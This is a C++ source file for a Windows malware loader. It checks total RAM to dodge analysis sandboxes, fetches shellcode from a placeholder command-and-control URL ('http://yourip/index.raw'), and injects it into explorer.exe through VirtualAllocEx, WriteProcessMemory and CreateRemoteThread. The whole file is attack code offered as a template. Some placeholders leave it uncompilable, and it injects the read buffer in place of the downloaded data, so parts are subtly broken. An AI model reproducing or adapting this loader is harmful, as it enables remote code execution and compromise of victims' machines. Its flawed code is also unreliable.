#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")

using namespace std;

BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
    const char* c2URL = "http://yourip/index.raw";
    IStream* stream;
    char buff[YOURSHELLCODESIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, YOURSHELLCODESIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    if (memoryCheck() == TRUE) {
                downloadAndExecute();
            }
    else {
        return 0;
    }
    return 0;
}